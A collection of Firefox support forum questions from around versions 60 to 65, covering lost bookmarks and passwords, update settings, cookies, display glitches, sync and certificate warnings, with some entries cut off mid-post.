"Firefox ESR will not load anything, not even about: pages since update to ESR 60.2","Last Thursday Firefox ESR was working fine till an update to ESR 60.2 was applied. Now I cannot load any page. Tried uninstalling, reset the winsock, refreshing, turned off Firewall and antivirus. Removed Mozilla from registry as well after uninstalling 3 times. This is happening for all profiles/users on the computer. We have to use the ESR in order to use some functionality of different websites for the business so changing to the another version will not work (although I installed the latest Firefox and it didnt work either). I am at a loss and have tried everything I have read."
"After update 62, all of my passwords are gone. How can I restore them?","Firefox is set for automatic updates. I have no issues with my anti-virus program. After Firefox update 62, all of my user IDs and passwords are gone. I have tried restoring everything via my pc (windows 8.1). I have tried restoring Firefox. The saved passwords and User names are gone. Is there a way to restore them, or do I need to rebuild the list....one at a time?"
"Cannot access att.net on Firefox, only on Safari","Cannot access att.net via Firefox but I can do so on Safari. ATT says it is an Apple email client issue, but it sounds like since my Apple mail works, this may be a bug due to Firefox upgrade to 62.0."
Why is it EVERY upgrade of FFox screws with website fonts?,"Always have to waste time fixing this. With the power of technology today, why can this never be solved? Last time I finally found some source advising me to log into admin config or something. Then change a '1' to a '2'. I tried it again this time. Does not remain resolved. Constant back & forth closing browser, restarting which fixes if for day or two, then back to same mess. WHY cannot this be resolved before sending out the upgrade?After I fixed this last upgrade, it remained fixed. Not THIS time. Fonts still reverting to skinny Hv light ital or similar. Not consistent. Could occur on some pages, others not."
Why Windows and Microsoft Edge screens appearing,"The screens in my attachments have started to appear randomly when i open Firefox 62. I have contacted Microsoft and the technician put my computer on remote. The technician spent over an hour searching for problems, scanned for corruption but found nothing. Microsoft Edge was disabled but i have never installed it and have been with Firefox for a long time. So, finally the technician went to an escalation technician and it was suggested that it could be something in Firefox and to uninstall it and reinstall it. This i am reluctant to do as things may be lost or changed. Could you give me advice please?"

My bookmarks reverted to a very old list.,"This is very weird. I lost a lot of my bookmarks, including folders I made a while ago. It looks like it reverted to a list of bookmarks from a long time ago.Al the bookmarks now have the same little globe picture instead of the normal ones representing the individual pages, like a red triangle for my YouTube Music links . I tried to restore them via Firefox itself. This failed. I tried Mozbackup, this failed. I uninstalled Firefox, restarted my computer and reinstalled. The wrong old bookmarks automatically appeared again and recovering still did not work. I still have a relatively recent list that I exported to Chrome. I could import them back in and can probably manually restore most by shifting folders and individual bookmarks around. In that case I would 'only' have lost a few weeks. Very annoying. I would like to know what happened, how to prevent this from happening again and a possible fix"

Delete Residual Privacy Data,"The autocomplete history of the Firefox address bar cannot be cleared through any in application options such as clearing ALL history or turning autocomplete off. The only way to remove this information is by deleting the places.sqlite file. I don't trust internet explorer because of it's hidden data and tyrannical protected files; I don't want this to be true of firefox too. I have used ccleaner, bleachbit, and wise disk cleaner but none of them touch this file despite claims to the contrary. This has got me wondering how many other hiding spots firefox has in binary files and registry keys potentially harboring years worth browsing history. So if it is possible, could I have list of all other records stored by firefox on my computer so that I might delete them preventing a privacy breach waiting to happen. I would appreciate any help someone can give regarding this matter."
Grouping duplicate logs,Is there any way to stop the Firefox Developer Panel from grouping duplicate logs in the output? It makes debugging difficult.
How do we restore the keyboard shortcuts to add www and .net/.org to queries typed in the address bar?,The shortcuts from Mozilla's support site (https://support.mozilla.org/en-US/kb/keyboard-shortcuts-perform-firefox-tasks-quickly#w_miscellaneous_3) to add www and .net/.org to address bar queries do not work properly anymore. Is there a way to restore these shortcuts?

Pin separate Windows 10 taskbar icons for separate simultaneous Firefox profiles,"Until Firefox 62.0, I was able to pin separate taskbar icons for separate, simultaneously running Firefox profiles in Windows 10 by doing the following:1) Add about:config boolean: ""taskbar.grouping.useprofile"" set to ""true."" (Described in this Mozilla bug-fix: https://bugzilla.mozilla.org/show_bug.cgi?id=577867)2) Set target of each separate pinned icon to ""C:\Program Files\Mozilla Firefox\firefox.exe"" -p [user-profile-name] -no-remoteHowever, with the latest update these settings have no longer have the intended effect, and open instances of multiple profiles are grouped into one taskbar icon.Is there a new way to pin separate taskbar icons for separate, simultaneously running profiles in Windows 10?"
changing icons for quantum,"New versions of Firefox regularly break things. Whether it's Netflix/Stan/Pronto or other streaming services, add-ons, re-invent the UI, some websites just stop working properly with the newer version or a number of other things.I have 10 PCs here. We are using 55.0.3 because it was the last version with a UI that we were all familiar with, worked with all the services we use, supported all the add-ons and more. It's very outdated but I want to keep all PCs on a known working environment. So I'm currently testing 61.0.2 (Not 62.0 because it's a zero release, which always have issues). I've managed to find solutions for most annoyances regarding add ons and using Photon-Australis to get back the curved tabs (The square look is just plain disgusting). I've got the reload icon back in the address bar, and hidden the 3 dots with a 30 second timeout so I will likely never have to be annoyed by it. I've got rid of the wasted spaces on the address bar too.I use a space theme (Earth from space). It uses a cyan font. On the white tabs it's all but invisible. Using the dark theme fixes that, but I'd like to have the tabs the same color as the background of the address bar as in v55. Reading through the userchrome.css file I just get lost. The other thing I'd like to preserve are the icons for home, download and bookmarks, Is there a way to preserve the icons that are used in v55 rather than the uglier ones use in v61?I'm sorry for coming across so negatively, it' just I don't get why developers keep changing UIs that are working. Change for the sake of change, which just adds frustration. Firefox is not the only program. Windows is probably the worst. So please don't be offended."
suddenly there are no categories in which to store bookmarks,"All of the sudden, I could not find any categories in which to place articles for storage. Only the tool bar menu and one other was available. I have a multitude of folders where did they go? They are, still, there when I go to find all bookmarks, but they are not there when I want to place an article in them. What happened and how do I fix this problem?"

"Firefox Quantum on macOS High Sierra will not load any mozilla.org website, including subdomains.","Today I installed Firefox Quantum on my Mac running High Sierra. It will not connect to any mozilla domain, including subdomains such as addons. Mozilla domains work fine on Chrome and Safari; I made sure proxy settings were sane (off). I have tried completely removing all traces of Firefox and reinstalling to ensure any weird preferences are wiped out. This did not change the behavior.

Way to select Syncable bookmarks?,"So I have a desktop PC with 2 accounts, one to keep work organized and the other for casual PC-things. I also have a laptop which I use for schoolwork. I am signed into the same FF account on all of these.Now I have accumulated a different set of bookmarks on all of those windows users, for understandable reasons, but there are also some general use ones that I have tried to sync to all of these. The sync however brings everything. Here is my main question:Is there a feature present or maybe in development that would allow me to select which bookmarks to Sync, say, by folder or smth?Also I would like to know this about the nature of the Sync options:If I tick the ""Bookmarks"" in the Sync options, it takes that user's bookmarks and pushes them into the sharing process, correct? Does the selection affect what is Synced INTO the current user? As in does the selection work as a simultaneous push/pull for the bookmark data or is just one or the other? The direction of sync isn't really clear on the options."

How to stop firefox ESR 52 from autoupdating?,"NOTE: This forum is quite bogus as it doesn't allow me to register just to reply to existing threads. So now you get yet another question for this topic that you're dodging all time, mozilla. Why are you behaving LAME like the rest of the internet?Now the actual issue. I am using Firefox 52 ESR due to the horrible npapi plugin for java. I am completely aware of all the security issues and so are my users. We are waiting for the developers to use something else than java. I run a Linux environment and I cannot run either Explorer or Safari. Recently Firefox ESR 52 started updating for no reason, even with updater disabled.I resolved by removing the updater binary and the updater.ini files in the Firefox ESR distribution. At least it seems it's not doing it automatically anymore. We will see how it works, since developers are behaving like apple developers in this forum, instead of disclosing technology they hide it.

Can Firefox be installed to internal drives other than C: and can there be multiple versions of Firefox on one machine?,"Hey all.I am looking to download the Firefox 52 ESR (at least I believe it's supposed to be 52, I dunno if it's 52.0 or one of the later builds) which is said to still work with Windows XP, in the hopes of getting Youtube working again as version 28 works fine on everything BUT that as mentioned here: https://support.mozilla.org/en-US/questions/1234282 , however I am extremely pressed for space on the Primary drive marked C:, which has me worried about downloading and installing a new version onto my primary internal hard drive. However I have two internal hard drives, C and W. Can the ESR be loaded onto a different internal drive (i.e. the W drive), and if so, will it be considered separate from version 28, which is my current version of the program, effectively allowing me to run both versions if I wish to? I know there is supposed to be a way to set up ""profiles"", which supposedly allow people to run multiple versions of a browser, but I'm not clear on how to do so as I am not a Tech guy. What I would need are pretty much simple, idiot proof instructions, on how to do this, so that I can either have both versions capable of being run, or at least be able to install the new browser to my second internal drive which has ample space to handle everything that the browser requires, space wise."

Firefox opens on second monitor but it is not connected,"locking as a duplicate of https://support.mozilla.org/en-US/questions/1234606At home I have a notebook docking station with 2-monitors. I shutdown and took my notebook to work and opened Firefox. There is an animation showing it opening to the right of my screen were I can see it. I figure this is because I last used Firefox on my secondary monitor and Firefox still thinks the monitor is connected. I have been using the same notebook, docking station, and monitors for several years and the only change I am aware of is that FIrefox updated just prior to this problem.Thankfully, my notebook has a VGA port so I can temporarily plug an extra monitor in so I can move Firefox to my notebook display. I could also make sure that Firefox is on my primary display before I shutdown and disconnect from my docking station. However these are NOT solutions.If you don't know how to fix this problem, I would be satisfied with knowing how to roll back to a stable version of Firefox.Thank you in advance!"

Occasional missing Chinese character,"Hi! I've recently been having a problem with displaying some Chinese characters on Firefox. It seems like some Chinese characters don't display at all (no boxes or anything) in some sans-serif fonts.

Also, as shown in the attached image its sans-serif form isn't visible in this page: https://zh.wiktionary.org/zh-hans/%E5%8F%98 while it is perfectly visible on Microsoft Edge. Inspecting the missing character shows that it's using the MS Gothic font.

How can I throttle firefox?,"I have trouble accessing a certain app via the internet. When I point firefox to it there are many files downloaded and many MBytes. The app partially loads then hangs and does not do anything more. I have already spent a huge amount of time trying to troubleshoot and have ruled out the usual kind of trouble such as memory issues etc. I have followed many support articles on this mozilla website.By looking at technical info and logs I see that firefox sends out many HTTP requests rapidly. Sends many out before receiving a response to one. I think what happens is there are so many responses coming rapidly from the servers that some get dropped in the local internet due to limits on the amount of traffic (congestion). My local internet is known to have limitations.So I want to try throttling firefox, that is make it send out HTTP requests slowly or wait for a reply before sending the next request. How can I do that?Again I want to emphasize I have already pursued many tips on this mozilla website so you don't need to suggest any of those."

I've been a user of Self-destructing cookies if that makes any difference.Where can I find code or documentation on meaning of the 'permission' field for entries of 'type' ""cookie"" in the 'moz_perms' table of permissions.sqlite? Is there a better or existing means of exporting cookie settings like this?"

How to prevent DOWNLOADING of video (not merely prevent autoplay) in Firefox,"This may sound like word games, but I'm not trying to be funny, merely specific.So I'm on a network with limited bandwidth. Therefore it's critical for me to understand what settings I can configure (if any) that will prevent the DOWNLOAD of video and/or large images from web sites.For example, your basic site nowadays probably uses HTML5 and may use that vs. the old-style Flash plug-ins to embed video. And yep classic HTML links with references to image files for the images.Back in the day you could configure a browser to ignore these references and then the browser would not even attempt to fetch the referenced image or video files. I've recently started using Firefox again, and I'm trying to learn how Firefox handles this in the HTML5 era (or rather what dumb users like me are supposed to do nowadays).I'm noticing most of the help literature is regarding disabling settings of the auto-PLAY feature. However, due to my ignorance of modern Firefox, perhaps I'm reading it wrong, but most of it seems to involve disabling plug-ins that activate after the file is downloaded, not preventing the actual download. Similar to if I'm using Microsoft Word to view a DOCX file from a web site, uninstalling Word doesn't prevent the DOCX file from downloading. What I don't want to do is cheerfully disable the video playing while my browser still happily downloads the video in the background... because my main goal is not to avoid the annoyance of autoplay, but my goal is to conserve bandwidth on my connection.FYI I'm using the latest version of Firefox Quantum on Manjaro Linux.Thanks for advice anyone can provide in helping bring me into the ""now"" of modern Firefox, or who can point me to any further help articles or instructions to help educate me about this. If I'm over-reading and disabling auto-PLAY also inherently disables the downloading of the associated media, super, but that distinction is not obvious in any of the documentation I've seen so far.Thanks!!"
Cannot directly print from Firefox,"Cannot print whole webpages using Menu>File>print. Any previews show a blank page when sent to my printer, or any other device, including Paperport 14.5. Also when sent a link via email for shipping labels, the link is displayed in FireFox browser, but is blank when I try to print it via the print link included on the page. Trying to print the entire page is blank also. I have no problem whatsoever with using Internet Explorer, but it is not my default broser, so I have to change from Firefox to IE as my default program to get the label to print."
Allow persistent cookies from bookmarked sites?,"I have configured Firefox to clear cookies (and other temporary data) when it closes. Basically giving me a clear state every time I start a new instance of Firefox. How-ever I would like to keep my cookies for bookmarked sites, since those cookies are considered useful to me. For example clicking on consent windows every day I visit a 'favorites' site is somehow annoying..Any suggestions?"
Flash Player v30 or Higher Not Loading Graphics on Games,"Hi. I use Flash Player primarily for games (on Kongregate, Armor, etc...). When Flash version 30 released, the graphics on high-content games are not loading properly. The problem is still there with Flash version 31.When the game opens, it hangs repeatedly trying to find the server to load the graphics. Opening any new screen that needs additional graphics causes the game to time out as well. This problem is unique to Firefox. I've played these games on Opera with the most current version of Flash and it runs properly (albeit the performance is not as good as on [pre-Flash v30] Firefox).Here is what I've tried so far: 1. enabling/disabling all extensions other than Flash (both individually and as a group) 2. disabling the ""block dangerous content"" option on the add-on page and disabling the Flash protected mode (each individually and then together)3. increasing/decreasing the allowable stored data on the Flash Global settings tab 4. adjusting the sandbox settings in Firefox (lowering from [default] 5 to 4, then to 3)5. turning on/off hardware acceleration6. disabling accessibility services7. adding the website hosting the game to the ""exceptions"" list to always allow cookies to be stored (which somehow gets erased every time I close Firefox)8. changing the dom.ipc.plugins.asyncdrawing.enabled setting to true/falseNone of these have corrected the issue with the graphics not loading. They are now back at their original settings.Ghostery, uBlock Origin, and Exif Viewer are the only add-ons that I run which would possibly interfere with loading content. Turning those on/off did not resolve the problem.The problem persists both on the current PC I am using (Windows 7 running 32-bit Firefox) and my other PC (Windows 10 running 64-bit Firefox).Would appreciate any help getting this fixed, as I would prefer to keep Firefox as my primary browser for these games. Thanks!"
Could you PLEASE accept the fact that some people actually prefer NOT to have phone style displays on a PC screen?,"Not everyone on the face of the planet wants a PC screen to look like a phone screen, seriously.

".ai, .pdf, .zip files all downloading very slowly","Hello, I started noticing this issue very recently. I'm running Firefox Quantum (62.0.2 64-Bit) on Mac OS High Sierra (10.13.6). I use Adobe Illustrator for work and more than often need to download .ai files from Firefox (part of how our work interface is set up). Normally, these .ai files open very quickly and load automatically into Illustrator, but now are taking much, much, longer to download, especially since the files are relatively small (for example, 164 kb). I caught the tail end of a download the other day, and for a 164 KB file, it was downloading at a rate of 810 bytes/sec. After a successful download, I notice that my computer will hang, and I will get the spinning wheel.I'm getting the same results with .zip and .pdf files. Image files, however, seem to download normally. The issue seems present in Chrome too, so I'm wondering if it's something with my computer (though my computer was purchased new in April 2018). Speed test is 150 Mbps download/158 upload, so I don't think it's my speed. I run McAfee LiveSafe and MalwareBytes and have found no malware; all the scans check out clean. I also quit both of these programs to see if that would make a difference with the downloading, but it didn't help.I've done the Refresh Firefox feature, cleared my cache, restarted plenty, uninstalled/reinstalled Firefox, but to no avail. I have also restarted Firefox in Safe Mode, and the problem still persisted in Safe Mode.For reference, this link will take you to a download file for a .zip file for a font I needed to download recently (on 1001fonts.com) https://www.1001fonts.com/kg-broken-vessels-sketch-font.htmlNormally, these font files would take seconds, but this particular one took at least a minute.

How can I view pdfs in night/dark mode within the Firefox Quantum browser?,"As of Quantum, it seems that Firefox will not allow any extensions/add-ons to modify their pdf viewer page, and Firefox will also not allow any other third party pdf viewers to be used (within the browser). That would be ok, I guess, if the Firefox viewer had a night mode built in or were otherwise a little more feature-rich. Is there something I haven't tried yet? And yes, I know I can choose to open a pdf in a third party application, but opening it within the browser would be much preferred."

Bookmarks deleted,Checked out the forums and tried a number of proposed solutions to no avail. The recent update wiped out all my bookmarks. Last thing I need to do is figure out why I can't access the profile default folder which might have the backup info in it. Tried as administrator but can't access the folder. Running Win 7 on this machine. Tried restoring bookmarks but all that did was wipe out the few bookmarks I recently saved. I tried using the info in the backup folder created by the update. It does not contain any old bookmarks. Like some others my business is impacted by this loss of data. How'd that even happen?

Disable auto update check but keep manual update in Firefox 63?,"Hi.In Firefox 63 the option to never check for updates was removed. The release notes suggest to create a policies.json to disable updates. This does not result in similar behaviour! It does indeed stop the checks for updates, but it also disables the option of manually checking for updates. So this is not the same!I'd like to know how I can disable the auto checking for updates, but keep the option to manually check and update.I found this thread regarding a beta version of Firefox: https://support.mozilla.org/en-US/questions/1232918 but that does not give an answer to my question.I typically check for updates every few days, but I do not want Firefox to check automatically and/or install without my express permission. I seem to be left with renaming the policies file every time I want to check for updates. Cumbersome and very user unfriendly.I would like to get back to the behaviour I have used for many years. To wit: I click on 'About Firefox' and I can see the version number without any checks or updates starting without my consent. I am presented with a button to check for updates. If I click it, I am presented with either a message stating I am up to date, or an option to update without it automatically doing so. And only if I then click to confirm that I indeed want to update, it starts downloading said update and installing it. This is what I want back please. How do I make that happen? Thanks."
Firefox options page home page not editable (dropdown does not drop down),"I've been helping my 88-year-old father with his PC. He has Windows 7, Firefox 63, and I'm trying to get it to stop updating because every time it does, it resets things - lately it's been asking him for his Firefox password, but he doesn't use any server-based Firefox features, so it's only causing confusion. He does NOT need to log onto Firefox sync. While I was fixing his settings, I noticed he had his home page set to Facebook, whereas previously, I had set it to the Firefox default for him (""New Tab"" still uses the default Firefox page). When I clicked on the dropdown to change from ""Custom URLs"", nothing dropped down, and I was unable to change the home page. Eventually, I reset all of his settings to default and restarted. Then he told me he actually did want Facebook for his home page, and now I couldn't set it back - clicking on the dropdown to change from ""Default"", again, nothing dropped down. I googled and found another way to change the home page by dragging a tab to the house icon on the page, and that worked, but I do not understand why I am not able to change the home page setting using the options page.Note: I have been fiddling with adding a policies.json file to try to prevent unwanted prompts for Firefox sync password and unwanted prompts for updating the browser. On the thought that that might have been causing a problem, I removed the line that disables update checks, but that didn't make any difference."

Multiple Twitch windows freeze up,"Hi,Multiple Twitch windows have never worked properly. Opening another tab/window would cause both streams to stutter and freeze up. That is until release of 63.0 then I could open several streams, even 4 with no stutters.63.0.1 however brought all the stutter and freezing back for multiple streams. So I downgraded to 63.0 with an install package over my old install, but for some reason this didn't fix the issue. A system restore did return me to my original 63.0 update state with no stutters again.My question is do others have this issue? Is it a known issue? Can this issue be fixed in future builds?"

Supposedly v63.0 fixed an issue w/address bar.,"FF 63.0.1Win 10This is what was supposedly fixed: Resolved an issue that prevented the address bar from autofilling bookmarked URLs in certain cases.If a bookmarked URL is similar to a frequently used URL, this is issue still present in v63.0.1, which I just downloaded today.Website addresses will fill in and then self-delete, so I am sitting with a blank open tab. Sometimes the address autofill but do not then unfill, but the website will not load. Sometimes the full URL will be listed below the bar and most of the time clicking on it (it says ""visit"") works. It is not consistent there and I usually cannot connect by filling in the address bar. Hit or miss, mostly miss.Thank you."

Firefox forces URL changes to unknown directory,"I'm suffering issues with Firefox on just one of my laptops. When I type in a web address, the url changes to something that I've accessed previously, but won't refresh. For example, if I type in the url of a local website, ""www.heriot.info"" and then <return>, the url changes to ""www.heriot.info/defaultsite"". Clearing the history and cache doesn't appear to make any difference.A possibly related issue is that Firefox won't refresh (at least some) pages. So, for example, I have a website analytics site that I access, but which doesn't refresh unless I delete all instances of the site from my web history and reaccess the page. So, if I forget to delete the history, I see data that isn't up to date - and clickin the refresh button doesn't change that.Any suggestions as to the root cause? Thanks!"
"Password keeps being rejected as incorrect in Firefox, same password works in alternative browsers.","I've had this issue for a long time, but always put it down to ""I must have typed it wrong"". It was undermining my sanity, but now I know I was always right! Sometimes when I try to log in to a website in Firefox, I will enter my password (correctly - some websites let you check what you've typed) and the website will return an error saying incorrect password. But, here's the thing... if I load the same website on Chrome or Edge and put the exact same password in, it will work. It will accept it. If it helps, most recently it happened on Visa Checkout pop-up for Ticketmaster. I didn't want to repeat the process in Edge as I would lose my tickets so instead I opted to reset password. I tried my old password and lo and behold, it said I cannot use my current password. Then... why didn't you let me in? I don't know if it's a Firefox issue or the way the websites are coded (I'm not a web dev, I know nothing of how they are optimized for browsers), but is there any chance this sounds familiar and someone could investigate somehow?"

"Firefox update 63.0.1 is ""super"" slow. Nothing in the fix suggestions works.","This has been an ongoing problem that started, first with update 63.0, and continues with update 63.0.1.I have tried multiple fix suggestions, including the very disappointing ""refresh Firefox"" option. While that did nothing to cure the problem, it did wipe out every saved password. That, to be blunt, really ticked me off. It says this fix solution will keep our saved information, with no mention of erasing passwords.Second, I changed the Network Settings as directed, from Use system proxy settings to auto-detect proxy settings for this network. I have been cautioned NOT to use the no proxy option, because it has a chance of rendering some websites unavailable. Not interested in messing up my browsing experience any worse than these recent Firefox updates have accomplished by themselves.All these problems aside, my biggest disappointment is in the total lack of communication from Mozilla. While I value the Firefox ideology and the mission to provide a more private internet browsing experience, all this is worthless to me if my pages load at something akin to dial-up speeds.At this juncture I have no choice but to use Google Chrome until someone can provide me with a workable solution, a solution that doesn't send me back to square one with all my saved Firefox information. If that is the only remedy, I might as well switch my default browser now and begin to re-acclimate myself to the changes.Thanks."
Problem: drag & drop bookmarks very tricky,"When one wants to click on a bookmark in the Bookmarks drop-down menu and moves the cursor down through several levels of categories, but inadvertently briefly moves the cursor outside the menu, no harm is done. The menu stays open until the cursor returns. Not so when one is trying to drag a URL *into* the drop-down menu. The briefest movement of the cursor outside the menu instantly causes the menu to disappear and one has to start all over again. Can this problem be fixed?"

Why is Firefox autofilling the address bar with URLS I've never visited?,"All of the sudden Firefox has started autofilling the address bar with URLS I've never visited.For example. I regularly type ""weather"" in the address bar to do a quick google search for the local forecast. It used to be that I only needed to type ""wea"" and hit enter as it would autofill ""weather"".Now, it autofills to something called ""weasner.com"" and then ""weather-widget.apk.black"", neither of which appear in my search history. Since the second one includes the word weather, I have to not only type the full word out but then erase the irrelevant part of the erroneous url.Where did this come from? Is there some way to turn it off and restrict Firefox to only suggesting terms I have searched before?"

I can't login to my firefox account,"Ever since Firefox updated today, it suddenly logged me out from my firefox account.As it was a long time since I last had the login prompt, it took me several attempts to get the correct password.I then received a confirmation email with the code, which I have entered correctly as required.

As my account info would be wiped, I'm not too keen on doing so."

Where's my RSS button?,"There used to be a button in the toolbar which let you see the RSS feed for a site, then it got removed but you could add it back through the customization menu. Now I can't seem to even do that. I guess that Firefox used the RSS button for its live bookmarks feature, and since they removed the live bookmarks they seem to have also removed the button? I only ever used the button to get the feed addresses though, so I could paste them into my RSS reader. So... if I could get the button back it would be great. Otherwise, maybe there's a plugin which does the same thing?"

Tabs getting stuck on touch screen devices.,"I'm having a problem with Firefox on my Surface Pro 4 tablet where selecting tabs just stops working, and the tabs in general are buggy and terrible. After fiddling around with it a bit, I've found how to replicate it.When I press the new tab button, it's supposed to open a new tab and switch to it.If the current tab is loading, it still switches to it, but both tabs are highlighted like they're the active tab. The new tab page is the one that appears on screen.Now, when both tabs are highlighted, if I close out of the original page that's not the new tab page, everything breaks. I can't switch tabs at all. I can open and close tabs, but I can't press any of the links on the new tab page, open a bookmark, or interact with the new tab page I have opened at all. If I close the new tab page that I have open, the new tab appears to have closed, but the screen doesn't change.It doesn't matter how many tabs I had opened before this. The only way to get Firefox working again is to exit out and come back.I'm on a 64 bit Windows 10 Surface Pro 4, and the problem exists in both standard Firefox and Nightly."

Just because people continue making new guitars does not mean old ones have no value. In fact, they often SOUND much better, & the same sort of thing applies to software. Older versions of Firefox (for XP) are INFINITELY better than the new versions, so I want the add ons and support details for those. It's easy enough to note the compatibility of different add ons in the pages on your site, and what is also silly is having to install things like old now missing from your site also) 'nightly tester tools' to make your old stuff work on 'ESR' releases. Part of the reason 'Chrome is taking over' is because your 'support' model is crazy. You can simply say something like 'we do not provide any customer service answers for XP'. That's fine, but LEAVE ALL THE ADD ONS AND THE PAGES UP! =) I will never switch my rental fleet of Dells away from XP, because it is infinitely superior to the stuff that came after. It's running almost all the ATMs & banks & power plants & shipping & so many other things. NEWER DOES NOT MEAN BETTER =) Contact me and I will also be happy to provide FREE 'customer support' for the many other people out there using XP versions of Firefox, or who would like to, but are unaware how much more AWESOME it is after tweaking it out with OLD 'obsolete' add ons ~;-)"

For this purpose it is useful to have the firefox cache for cookies storedwithin the windows user profile.But the simple speed enhancing webcontent storage is actually ruining theexperience of users having to wait uselessly for these kind of cached data.For this part of the cache it would be totally sufficient to store it somewhereelse outside the backuped user profiles.I would be happy if there's a solution to this.

"Firefox will not play some videos from Autonews.com, only. Chrome will play them all?","I have been using Firefox for many years no trouble.

I called Autonews and their tech said to try it with Google Chrome. I did and with that browser the Autonews videos play OK just like it used to with Firefox -( which I like better). Thus a Firefox issue. They told me to try clearing my firefox 'History' which I did- for 'one day' but no help.

"iframes, sessions within iframes, CORs & 3rd Party Cookies - Any documentation, and interaction should allow cookies?","As a web developer, I create a lot of embeddable cross origin iframe widgets. Unfortunately, if you have configured the Firefox setting of ""Block cookies and site data"" to ""Cookies from unvisited websites"", my iframe widgets no longer work when used on a cross origin domain, as they rely on user sessions. Is there any documentation that defines what 3rd party cookies are? I understand some users want to block them (as I myself was doing until I realized that would break my iframe widgets), but what I don't understand is why the cookies are continually blocked if a user specifically interacts with an iframe widget. Doesn't user interaction imply it's now a visited website? I should think the first load of the iframe would trigger blocked cookies, but if the user interacts with the iframe content willingly (by clicking a button which triggers an ajax call, for example), any resulting cookies should be respected even if Firefox is set to block 3rd party cookies. I'm all for blocking 3rd party cookies that are loaded dynamically and are unwelcome, but if the user starts interacting with these iframes or controls, it would make sense to allow cookies, and that would be enough for my apps to not be broken if the user blocks 3rd party cookies. I think web developers need a solution for keeping their legitimate cross origin apps from being blocked by 3rd party cookie settings if users are interacting and using them.I put together a sample application that shows how Firefox blocking third party cookies completely breaks sessions (since the cookie that is returned from the iframe call is discarded / not used).https://github.com/own3mall/firefox-3rd-party-cookies-testI created a basic test to see if I could get Firefox to maintain sessions with iframes using a cross origin domain as the source. Unfortunately, I could not. Is there any work-around, or an easy way to detect the user's 3rd party cookie settings so I can warn them? I'd still like to know what is considered 3rd party, and what happens if you visit the cross origin domain directly in another tab before interacting with that iframe. Is it still considered 3rd party then? What is the behavior and rules for this? This seems like a serious problem that needs a better solution, and I like the interaction idea."

Cookie permission button not working,"I'm experiencing a long-lived bug, or more possibly file corruption, that became important very recently. Due to another bug in Firefox 65 (https://support.mozilla.org/en-US/questions/1249037), I need to change cookie permissions. In the preference panel under ""Cookies and Site Data"", the ""Manage Permissions"" button doesn't work, although being not gray. After clicking this button, the expected window is not shown visibly. However invisible window still blocks keyboard and mouse input to the original firefox window. Clicking away from the center of the screen or Esc would disengage and possibly close the invisible window. The consequence is that I can't see or change permissions from this window. I have been having this problem for several firefox updates so it's more like a corrupted file. Despite that, cookie permissions still function properly and can be updated through the icon on the address bar.Although there are workarounds such as through the icon on the address bar, this is really inconvenient and makes it hardly possible to edit cross site or cross subdomain cookie permissions.

The development team has done a very good job growing the products.I am slowly seeing little annoyances pop in the browser product that is reminding me more of IE. I am loosing my control over the product. I realize the annoyances I am seeing are to protect me but as a seasoned technical person I know where to go on the internet and what links not to click on. After Firefox update 62 you can no longer disable update notifications. I totally get there are more less technical users of Firefox out there then there are IT experts. You are trying to protect the less techy folks for the greater good.I ask the dev team to please remember us Tech Savvy individuals and if you hide settings in the preferences container to please please leave them in the other container.Thanks,your biggest fan!"
Google Meet/Hangouts random audio issues,"Using Firefox 65.0, for some reason Google Meet/Hangouts has a random very, very annoying audio issue. When the call has more than 5 callers, the audio of some is not heard, I can see they are not muted, other callers can hear them (using Chrome probably) but I cannot.Not sure really what it is but it's incredible annoying for meetings because you cannot hear some callers.Right now I went back to Chrome because I cannot have meetings missing out on what some callers say.I tried disabling all addons, left just Bitwarden because I need it, but not sure what else to try.I know reproducing it would be hard, but I cannot fully use Firefox like this.Thanks."

How do I get rid of the dropdown bar that began appearing in Firefox 65.0?,"One of the reasons I hate upgrading Firefox is that every new version brings a host of anti-features.Starting in 65.0, whenever I am typing into the address bar, one (blue) or two (blue and black) bars drop down (depending on how much of the address I have typed) offering to either search or go to the address bar contents.I DON'T WANT THEM!!!!!How do I get rid of them?"

I am unable to sync to my account. The email gets returned.,"I have had problems with Firefox Sync for a while.I often reinstall operating systems I use. After each reinstall, I try to sync to my account. I get denied. The email gets returned.I have bypassed this problem a number of times. I am not sure about the exact solution, but either waiting for 24 hours since last attempt to login or fiddling with Firefox Sync settings through my phone which is already logged in seemed to have helped.Fiddling with phone settings does not work anymore. It may have never worked. I have not waited 24 hours since last attempt to login as well, so that could be the fix I am looking for. However, the main problem I have, is that I cannot bypass it in any other way. I am able to login to Firefox Screenshots for example with my account, but I cannot sign in to my Firefox account itself. It is not a good user experience.I understand that this might be used for my own sake, to protect my account from potential intruders...however, I am very dissatisfied with not being able to sign it to my account for over couple of days because of such restrictions.I do not think anyone can do anything about this, it will probably require redesigning existing safety measures just to deal with this obscure problem. I will wait for 24 hours and will update this post after I get the result. Maybe I can help someone else who is on the same boat as I am. I could not see similar problem on the internet other than a few, of which did not portray the problem in a way that I found relatable.But maybe there is another way unbeknownst to me.Either way, thank you for reading. I hope you have a nice day."

Images won't save correctly after update,"So I noticed this recently (sometime after the latest update) where now if I try to save an image it'll either 1) not add the right extension (like .png or .jpg) or will try to save it as a html document. I'm not able to add the extension in the name itself as then my programs just complain about it being an incorrect image format, and it's not any of my add-ons as I did try in safe mode as well and another browser (the other browser worked fine).I already found this thread recently (https://support.mozilla.org/en-US/questions/1248840) where they were having the exact same issue. However, this didn't fix my problem because it either made some images suddenly disappear (no thumbnails at all) or continued to try and save the image as an invalid format. Any ideas how to fix this? Or just have to wait until update fixes it?"

Trust self-signed printer certificates,"I work in a position that requires me to log in to several printer web interfaces every day on a company intranet, and every time I pull up a printer's site Firefox shows me a certificate error. I know that this is because the printer is signing its own certificates, that much is obvious from the error. I want to know if there is a way to allow certificate errors for a certain sub-net or if there is a way to trust many certificates at once. I could potentially write some sort of script to capture all of the printer certificates, but then I do not know of any way to add those certificates to the Firefox exception store.If it were only 20 - 30 printers then I would just load every printer interface separately. But I support an environment with ~2000 printers so that would not be practical. (10 - 20 seconds at least to trust each printer cert)."

